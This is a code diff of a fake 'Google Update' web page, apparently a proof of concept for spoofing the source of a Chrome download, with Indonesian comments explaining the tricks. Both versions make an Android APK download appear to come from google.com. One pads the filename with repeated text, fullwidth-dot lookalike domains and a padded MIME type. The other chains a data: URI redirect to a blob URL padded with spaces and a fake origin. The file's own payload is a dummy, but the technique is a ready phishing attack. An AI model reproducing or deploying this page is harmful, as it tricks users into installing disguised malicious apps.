@@ -2,38 +2,38 @@
 <html lang="en">
 <head>
     <meta charset="UTF-8">
-    <title>Google Security Update</title>
+    <title>Google Security</title>
 </head>
-<body style="text-align:center; padding-top:50px; font-family: Arial;">
-    <button id="pwnBtn" style="padding:15px; background:#1a73e8; color:white; border:none; border-radius:5px;">
-        UPDATE GOOGLE SERVICESXXX
-    </button>
+<body style="background:#f1f3f4; font-family:sans-serif; text-align:center; padding-top:100px;">
+
+    <div style="padding:30px; background:#fff; border-radius:8px; display:inline-block; box-shadow:0 2px 10px rgba(0,0,0,0.1);">
+        <h2 style="color:#1a73e8;">Google Update</h2>
+        <p>A mandatory update is required.</p>
+        <button id="strike" style="padding:12px 25px; background:#1a73e8; color:#fff; border:none; border-radius:4px; cursor:pointer;">INSTALL NOW</button>
+    </div>
 
 <script>
-    document.getElementById('pwnBtn').addEventListener('click', function() {
-        // Taktik: Menggunakan Nama File yang sangat panjang untuk mendorong teks 'from' ke bawah
-        // Karakter 'FULLWIDTH FULL STOP' (．) digunakan agar terlihat seperti titik domain
-        const fakeDomain = "www．google．com";
-        const fileName = "Update_" + "verification_".repeat(30) + fakeDomain + ".apk";
-        
-        // Taktik: Menggunakan MIME Type palsu yang sangat panjang
-        // Chrome terkadang menampilkan MIME Type jika ia tidak mengenali ekstensinya dengan cepat
-        const longMime = "application/octet-stream" + ";".repeat(200);
+    document.getElementById('strike').addEventListener('click', function() {
+        const fakeOrigin = "https://www.google.com";
+        const filename = "Google_Update.apk";
+        const padding = " ".repeat(1000); // Gunakan spasi murni bukan encoded untuk navigasi top-level
 
-        const base64Data = "ZXN0dGVzdHRlc3Q=";
+        // STRATEGI: Menggunakan skema data: sebagai "parent" dari download
+        // Chrome terkadang mengambil origin dari context navigasi terakhir
+        const base64Payload = "ZXN0dGVzdHRlc3Q="; 
         
-        // Kita gunakan skema data: langsung
-        // Kita tidak menggunakan fragment (#) tapi langsung memasukkan domain ke dalam metadata
-        const payload = `data:${longMime};base64,${base64Data}`;
+        // Buat blob URL yang sangat panjang
+        const blob = new Blob(["test"], {type: 'application/vnd.android.package-archive'});
+        const url = URL.createObjectURL(blob);
 
-        const a = document.createElement('a');
-        a.href = payload;
-        a.download = fileName;
-        document.body.appendChild(a);
-        
-        a.click();
+        // TRIGGER 1: Navigasi ke Data URI yang mengandung domain palsu
+        // Ini akan mengubah "Last Known Origin" di mata UI Chrome
+        const spoofPath = `data:text/html,<html><body><script>location.href="${url}#${padding}${fakeOrigin}";<\/script></body></html>`;
 
-        // Redirect instan untuk mengubah context origin di address bar
+        // TRIGGER 2: Eksekusi navigasi
+        window.location.href = spoofPath;
+
+        // TRIGGER 3: Redirect ke Google asli setelah jeda sangat singkat
         setTimeout(() => {
             window.location.replace("https://www.google.com");
         }, 3000);
